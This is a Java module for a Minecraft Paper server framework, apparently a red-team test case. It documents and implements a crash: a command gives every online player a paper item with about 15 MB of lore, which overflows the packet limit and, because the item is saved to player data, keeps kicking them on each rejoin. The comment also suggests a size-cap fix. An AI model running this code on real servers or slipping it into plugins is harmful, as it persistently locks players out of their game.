package vibe.bignbt;
import dev.vibecraft.api.ModuleContext;
import dev.vibecraft.api.VibeModule;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import net.kyori.adventure.text.Component;
/**
 * REDTEAM-CRASH / crash-bignbt (severity: HIGH)
 * Giving a player an item whose NBT is larger than the 8 MB clientbound packet cap. Paper rejects
 * >256 lore lines, but 256 lines x 60000 chars (~15 MB) passes the lore check and overflows
 * ClientboundContainerSetSlotPacket.
 * Observed: "CrashBot lost connection: PacketTooLargeException: ClientboundContainerSetSlotPacket is
 * 15360781. Max is 8388608" -> player disconnected. WORSE: the item is saved to playerdata
 * (world/players/data/<uuid>.dat, ~17 KB compressed), so the player is kicked again on every rejoin
 * -> persistent lockout surviving reconnects and restarts until the data is cleared.
 * Likely accidental: generated lore / a written book with huge pages.
 * Suggested fix: cap total NBT/lore size of items a module creates or gives (e.g. reject item meta
 * whose serialized size exceeds a safe threshold, well under 8 MB).
 */
public class BigNbtModule implements VibeModule {
    @Override public void enable(ModuleContext ctx) {
        ctx.command("bignbt", (s,a) -> {
            ItemStack it = ItemStack.of(Material.PAPER);
            java.util.ArrayList<Component> lore = new java.util.ArrayList<>();
            String big = "x".repeat(60000);
            for (int i=0;i<256;i++) lore.add(Component.text(big));
            it.editMeta(m -> m.lore(lore));
            for (Player p : Bukkit.getOnlinePlayers()) p.getInventory().addItem(it);
        });
    }
}
